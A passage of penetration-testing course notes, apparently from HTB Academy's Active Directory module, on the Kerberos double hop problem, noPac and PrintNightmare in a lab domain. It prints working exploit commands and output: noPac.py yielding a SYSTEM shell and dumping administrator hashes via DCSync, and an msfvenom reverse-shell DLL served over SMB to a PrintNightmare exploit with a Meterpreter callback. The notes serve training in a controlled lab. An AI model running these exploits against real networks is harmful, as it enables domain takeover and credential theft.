.\\PowerView.ps1\n\n|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK\n|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents> get-domainuser -spn\nException calling \"FindAll\" with \"0\" argument(s): \"An operations error occurred.\n\"\nAt C:\\Users\\backupadm\\Documents\\PowerView.ps1:5253 char:20\n+             else { $Results = $UserSearcher.FindAll() }\n+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : DirectoryServicesCOMException\n```\n\nIf we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.\n\nKerberos \"Double Hop\" Problem\n\n```shell-session\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents> klist\n\nCurrent LogonId is 0:0x57f8a\n\nCached Tickets: (1)\n\n#0> Client: backupadm @ INLANEFREIGHT.LOCAL\n    Server: academy-aen-ms0$ @\n    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize\n    Start Time: 6/28/2022 7:31:53 (local)\n    End Time:   6/28/2022 7:46:53 (local)\n    Renew Time: 7/5/2022 7:31:18 (local)\n    Session Key Type: AES-256-CTS-HMAC-SHA1-96\n    Cache Flags: 0x4 -> S4U\n    Kdc Called: DC01.INLANEFREIGHT.LOCAL\n```\n\nSo now, let's set up a PSCredential object and try again. First, we set up our authentication.\n\nKerberos \"Double Hop\" Problem\n\n```shell-session\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force\n\n|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK\n|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\backupadm', $SecPassword)\n```\n\nNow we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.\n\nKerberos \"Double Hop\" Problem\n\n```shell-session\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents> get-domainuser -spn -credential $Cred | select samaccountname\n\n|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK\n|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK\n\nsamaccountname\n--------------\nazureconnect\nbackupjob\nkrbtgt\nmssqlsvc\nsqltest\nsqlqa\nsqldev\nmssqladm\nsvc_sql\nsqlprod\nsapsso\nsapvc\nvmwarescvc\n```\n\nIf we try again without specifying the `-credential` flag, we once again get an error message.\n\nKerberos \"Double Hop\" Problem\n\n```shell-session\nget-domainuser -spn | select \n\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents> get-domainuser -spn | select samaccountname \n\n|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK\n|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK\nException calling \"FindAll\" with \"0\" argument(s): \"An operations error occurred.\n\"\nAt C:\\Users\\backupadm\\Documents\\PowerView.ps1:5253 char:20\n+             else { $Results = $UserSearcher.FindAll() }\n+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : DirectoryServicesCOMException\n```\n\nIf we RDP to the same host, open a CMD prompt, and type `klist`, we'll see that we have the necessary tickets cached to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. This is because our password is stored in memory, so it can be sent along with every request we make.\n\nKerberos \"Double Hop\" Problem\n\n```cmd-session\nC:\\htb> klist\n\nCurrent LogonId is 0:0x1e5b8b\n\nCached Tickets: (4)\n\n#0>     Client: backupadm @ INLANEFREIGHT.LOCAL\n        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize\n        Start Time: 6/28/2022 9:13:38 (local)\n        End Time:   6/28/2022 19:13:38 (local)\n        Renew Time: 7/5/2022 9:13:38 (local)\n        Session Key Type: AES-256-CTS-HMAC-SHA1-96\n        Cache Flags: 0x2 -> DELEGATION\n        Kdc Called: DC01.INLANEFREIGHT.LOCAL\n\n#1>     Client: backupadm @ INLANEFREIGHT.LOCAL\n        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize\n        Start Time: 6/28/2022 9:13:38 (local)\n        End Time:   6/28/2022 19:13:38 (local)\n        Renew Time: 7/5/2022 9:13:38 (local)\n        Session Key Type: AES-256-CTS-HMAC-SHA1-96\n        Cache Flags: 0x1 -> PRIMARY\n        Kdc Called: DC01.INLANEFREIGHT.LOCAL\n\n#2>     Client: backupadm @ INLANEFREIGHT.LOCAL\n        Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize\n        Start Time: 6/28/2022 9:13:38 (local)\n        End Time:   6/28/2022 19:13:38 (local)\n        Renew Time: 7/5/2022 9:13:38 (local)\n        Session Key Type: AES-256-CTS-HMAC-SHA1-96\n        Cache Flags: 0\n        Kdc Called: DC01.INLANEFREIGHT.LOCAL\n\n#3>     Client: backupadm @ INLANEFREIGHT.LOCAL\n        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize\n        Start Time: 6/28/2022 9:13:38 (local)\n        End Time:   6/28/2022 19:13:38 (local)\n        Renew Time: 7/5/2022 9:13:38 (local)\n        Session Key Type: AES-256-CTS-HMAC-SHA1-96\n        Cache Flags: 0\n        Kdc Called: DC01.INLANEFREIGHT.LOCAL\n```\n\n---\n\n## Workaround #2: Register PSSession Configuration\n\nWe've seen what we can do to overcome this problem when using a tool such as `evil-winrm` to connect to a host via WinRM. What if we're on a domain-joined host and can connect remotely to another using WinRM? Or we are working from a Windows attack host and connect to our target via WinRM using the [Enter-PSSession cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)? Here we have another option to change our setup to be able to interact directly with the DC or other hosts/resources without having to set up a PSCredential object and include credentials along with every command (which may not be an option with some tools).\n\nLet's start by first establishing a WinRM session on the remote host.\n\nKerberos \"Double Hop\" Problem\n\n```powershell-session\nPS C:\\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\\backupadm\n```\n\nIf we check for cached tickets using `klist`, we'll see that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. We can see that our current TGS is good for accessing the HTTP service on the target since we connected over WinRM, which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.\n\nKerberos \"Double Hop\" Problem\n\n```powershell-session\n[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\\Users\\backupadm\\Documents> klist\n\nCurrent LogonId is 0:0x11e387\n\nCached Tickets: (1)\n\n#0>     Client: backupadm @ INLANEFREIGHT.LOCAL\n       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL\n       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize\n       Start Time: 6/28/2022 9:09:19 (local)\n       End Time:   6/28/2022 19:09:19 (local)\n       Renew Time: 0\n       Session Key Type: AES-256-CTS-HMAC-SHA1-96\n       Cache Flags: 0x8 -> ASC\n       Kdc Called:\n```\n\nWe also cannot interact directly with the DC using PowerView\n\nKerberos \"Double Hop\" Problem\n\n```powershell-session\n[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\\Users\\backupadm\\Documents> Import-Module .\\PowerView.ps1\n[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\\Users\\backupadm\\Documents> get-domainuser -spn | select samaccountname\n\nException calling \"FindAll\" with \"0\" argument(s): \"An operations error occurred.\n\"\nAt C:\\Users\\backupadm\\Documents\\PowerView.ps1:5253 char:20\n+             else { $Results = $UserSearcher.FindAll() }\n+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n   + FullyQualifiedErrorId : DirectoryServicesCOMException\n```\n\nOne trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.\n\nKerberos \"Double Hop\" Problem\n\n```powershell-session\nPS C:\\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\\backupadm\n\n WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce\n a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows\nPowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.\nWARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has\nrecently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be\n required.\nAll WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session\nconfigurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.\n\n   WSManConfig: Microsoft.WSMan.Management\\WSMan::localhost\\Plugin\n\nType            Keys                                Name\n----            ----                                ----\nContainer       {Name=backupadmsess}                backupadmsess\n```\n\nOnce this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.\n\nAfter we start the session, we can see that the double hop problem has been eliminated, and if we type `klist`, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the `backupadm` user and all requests from our local machine will be sent directly to the Domain Controller.\n\nKerberos \"Double Hop\" Problem\n\n```powershell-session\nPS C:\\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm -ConfigurationName  backupadmsess\n[DEV01]: PS C:\\Users\\backupadm\\Documents> klist\n\nCurrent LogonId is 0:0x2239ba\n\nCached Tickets: (1)\n\n#0>     Client: backupadm @ INLANEFREIGHT.LOCAL\n       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL\n       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize\n       Start Time: 6/28/2022 13:24:37 (local)\n       End Time:   6/28/2022 23:24:37 (local)\n       Renew Time: 7/5/2022 13:24:37 (local)\n       Session Key Type: AES-256-CTS-HMAC-SHA1-96\n       Cache Flags: 0x1 -> PRIMARY\n       Kdc Called: DC01\n```\n\nWe can now run tools such as PowerView without having to create a new PSCredential object.\n\nKerberos \"Double Hop\" Problem\n\n```powershell-session\n[DEV01]: PS C:\\Users\\Public> get-domainuser -spn | select samaccountname\n\nsamaccountname\n--------------\nazureconnect\nbackupjob\nkrbtgt\nmssqlsvc\nsqltest\nsqlqa\nsqldev\nmssqladm\nsvc_sql\nsqlprod\nsapsso\nsapvc\nvmwarescvc\n```\n\nNote: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like `-RunAsCredential $Cred`, we will get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials. This method is still highly effective if we are testing from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a \"jump host\" to mount further attacks against hosts in the environment. .\n\nWe can also use other methods such as CredSSP, port forwarding, or injecting into a process running in the context of a target user (sacrificial process) that we won't cover here.\n\n---\n\n## Wrap Up\n\nIn this section, we've seen how to overcome the Kerberos \"Double Hop\" problem when working with WinRM in an AD environment. We will encounter this often during our assessments, so we must understand the issue and have certain tactics in our toolbox to avoid losing time.\n\nThe following section will cover other ways to escalate privileges and move laterally in a domain once we have valid credentials using various critical vulnerabilities identified throughout 2021.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/26- Bleeding Edge Vulnerabilities",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/26- Bleeding Edge Vulnerabilities.md",
    "title": "26  Bleeding Edge Vulnerabilities",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- When it comes to patch management and cycles, many organizations are not quick to roll out patches through their networks. Because of this, we may be able to achieve a quick win either for initial...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nWhen it comes to patch management and cycles, many organizations are not quick to roll out patches through their networks. Because of this, we may be able to achieve a quick win either for initial access or domain privilege escalation using a very recent tactic. At the time of writing (April 2022), the three techniques shown in this section are relatively recent (within the last 6-9 months). These are advanced topics that can not be covered thoroughly in one module section. The purpose of demonstrating these attacks is to allow students to try out the latest and greatest attacks in a controlled lab environment and present topics that will be covered in extreme depth in more advanced Active Directory modules. As with any attack, if you do not understand how these work or the risk they could pose to a production environment, it would be best not to attempt them during a real-world client engagement. That being said, these techniques could be considered \"safe\" and less destructive than attacks such as [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) or [DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/). Still, we should always exercise caution, take detailed notes, and communicate with our clients. All attacks come with a risk. For example, the `PrintNightmare` attack could potentially crash the print spooler service on a remote host and cause a service disruption.\n\nAs information security practitioners in a rapidly changing and evolving field, we must keep ourselves sharp and on top of recent attacks and new tools and techniques. We recommend trying out all of the techniques in this section and doing additional research to find other methods for performing these attacks. Now, let's dive in.\n\n---\n\n## Scenario Setup\n\nIn this section, we will perform all examples from a Linux attack host. You can spawn the hosts for this section at the end of this section and SSH into the ATTACK01 Linux attack host. For the portion of this section that demonstrates interaction from a Windows host (using Rubeus and Mimikatz), you could spawn the MS01 attack host in the previous or next section and use the base64 certificate blob obtained using `ntlmrelayx.py` and `petitpotam.py` to perform the same pass-the-ticket attack using Rubeus as demonstrated near the end of this section.\n\n---\n\n## NoPac (SamAccountName Spoofing)\n\nA great example of an emerging threat is the [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing` released at the end of 2021. This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.\n\n|42278|42287|\n|---|---|\n|`42278` is a bypass vulnerability with the Security Account Manager (SAM).|`42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.|\n\nThis exploit path takes advantage of being able to change the `SamAccountName` of a computer account to that of a Domain Controller. By default, authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).\n\nWe can use this [tool](https://github.com/Ridter/noPac) to perform this attack. This tool is present on the ATTACK01 host in `/opt/noPac`.\n\nNoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed. We can use these commands to do so:\n\n#### Ensuring Impacket is Installed\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git\n```\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ python setup.py install \n```\n\n#### Cloning the NoPac Exploit Repo\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ git clone https://github.com/Ridter/noPac.git\n```\n\nOnce Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to 10. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to `0` can prevent quite a few AD attacks.\n\n#### Scanning for NoPac\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap\n\n███    ██  ██████  ██████   █████   ██████ \n████   ██ ██    ██ ██   ██ ██   ██ ██      \n██ ██  ██ ██    ██ ██████  ███████ ██      \n██  ██ ██ ██    ██ ██      ██   ██ ██      \n██   ████  ██████  ██      ██   ██  ██████ \n                                           \n[*] Current ms-DS-MachineAccountQuota = 10\n[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484\n[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663\n```\n\nThere are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be \"noisy\" or may be blocked by AV or EDR.\n\n#### Running NoPac & Getting a Shell\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap\n\n███    ██  ██████  ██████   █████   ██████ \n████   ██ ██    ██ ██   ██ ██   ██ ██      \n██ ██  ██ ██    ██ ██████  ███████ ██      \n██  ██ ██ ██    ██ ██      ██   ██ ██      \n██   ████  ██████  ██      ██   ██  ██████ \n                                               \n[*] Current ms-DS-MachineAccountQuota = 10\n[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n[*] will try to impersonat administrator\n[*] Adding Computer Account \"WIN-LWJFQMAXRVN$\"\n[*] MachineAccount \"WIN-LWJFQMAXRVN$\" password = &A#x8X^5iLva\n[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.\n[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL\n[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01\n[*] Saving ticket in ACADEMY-EA-DC01.ccache\n[*] Resting the machine account to WIN-LWJFQMAXRVN$\n[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value\n[*] Using TGT from cache\n[*] Impersonating administrator\n[*] \tRequesting S4U2self\n[*] Saving ticket in administrator.ccache\n[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n[*] Rename ccache with target ...\n[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$\n[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.\n[*] Pls make sure your choice hostname and the -dc-ip are same machine !!\n[*] Exploiting..\n[!] Launching semi-interactive shell - Careful what you execute\nC:\\Windows\\system32>\n```\n\nWe will notice that a `semi-interactive shell session` is established with the target using [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py). Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`.\n\nIt is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.\n\n#### Confirming the Location of Saved Tickets\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ ls\n\nadministrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils\nREADME.md  scanner.py\n```\n\nWe could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.\n\n#### Using noPac to DCSync the Built-in Administrator Account\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator\n\n███    ██  ██████  ██████   █████   ██████ \n████   ██ ██    ██ ██   ██ ██   ██ ██      \n██ ██  ██ ██    ██ ██████  ███████ ██      \n██  ██ ██ ██    ██ ██      ██   ██ ██      \n██   ████  ██████  ██      ██   ██  ██████ \n                                                                    \n[*] Current ms-DS-MachineAccountQuota = 10\n[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n[*] will try to impersonat administrator\n[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n[*] Pls make sure your choice hostname and the -dc-ip are same machine !!\n[*] Exploiting..\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\ninlanefreight.local\\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\n[*] Kerberos keys grabbed\ninlanefreight.local\\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6\ninlanefreight.local\\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25\ninlanefreight.local\\administrator:des-cbc-md5:70add6e02f70321f\n[*] Cleaning up...\n```\n\n---\n\n## Windows Defender & SMBEXEC.py Considerations\n\nIf Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called `BTOBTO`. Another service called `BTOBO` is created, and any command we type is sent to the target over SMB inside a .bat file called `execute.bat`. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.\n\n#### Windows Defender Quarantine Log\n\n![Windows Security alert for VirTool:Win32/MSPSEexecCommand, alert level severe, status removed, dated 3/25/2022.](https://academy.hackthebox.com/storage/modules/143/defenderLog.png)\n\nIf opsec or being \"quiet\" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py. The focus of this module is on tactics and techniques. We will refine our methodology as we progress in more advanced modules, but we first must obtain a solid base in enumerating and attacking Active Directory.\n\n---\n\n## PrintNightmare\n\n`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.\n\nBefore conducting this attack, we must retrieve the exploit we will use. In this case, we will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit. We can use Git to clone it to our attack host:\n\n#### Cloning the Exploit\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git\n```\n\nFor this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on ATTACK01 in the lab). We can use the commands below to accomplish this:\n\n#### Install cube0x0's Version of Impacket\n\nBleeding Edge Vulnerabilities\n\n```shell-session\npip3 uninstall impacket\ngit clone https://github.com/cube0x0/impacket\ncd impacket\npython3 ./setup.py install\n```\n\nWe can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.\n\n#### Enumerating for MS-RPRN\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'\n\nProtocol: [MS-PAR]: Print System Asynchronous Remote Protocol \nProtocol: [MS-RPRN]: Print System Remote Protocol \n```\n\nAfter confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.\n\n#### Generating a DLL Payload\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of dll file: 8704 bytes\n```\n\nWe will then host this payload in an SMB share we create on our attack host using `smbserver.py`.\n\n#### Creating a Share with smbserver.py\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll\n\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\nOnce the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.\n\n#### Configuring & Starting MSF multi/handler\n\nBleeding Edge Vulnerabilities\n\n```shell-session\n[msf](Jobs:0 Agents:0) >> use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\n[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp\nPAYLOAD => windows/x64/meterpreter/reverse_tcp\n[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225\nLHOST => 10.3.88.114\n[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080\nLPORT => 8080\n[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run\n\n[*] Started reverse TCP handler on 172.16.5.225:8080 \n```\n\nWith the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:\n\n#### Running the Exploit\n\nBleeding Edge Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\\\172.16.5.225\\CompData\\backupscript.dll'\n\n[*] Connecting to ncacn_np:172.16.5.5[\\PIPE\\spoolss]\n[+] Bind OK\n[+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\n[*] Executing \\??\\UNC\\172.16.5.225\\CompData\\backupscript.dll\n[*] Try 1...\n[*] Stage0: 0\n[*] Try 2...\n[*] Stage0: 0\n[*] Try 3...\n\n<SNIP>\n```\n\nNotice how at the end of the command, we include the path to the share hosting our payload (`\\\\<ip address of attack host>\\ShareName\\nameofpayload.dll`). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.\n\n#### Getting the SYSTEM Shell\n\nBleeding Edge Vulnerabilities\n\n```shell-session\n[*] Sending stage (200262 bytes) to 172.16.5.5\n[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400\n\n(Meterpreter 1)(C:\\Windows\\system32) > shell\nProcess 5912 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.737]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nwhoami\nnt authority\\system\n```\n\nOnce the exploit has been run, we will notice that a Meterpreter session has been started. We can then drop into a SYSTEM shell and see that we have NT AUTHORITY\\SYSTEM privileges on the target Domain Controller starting from just a 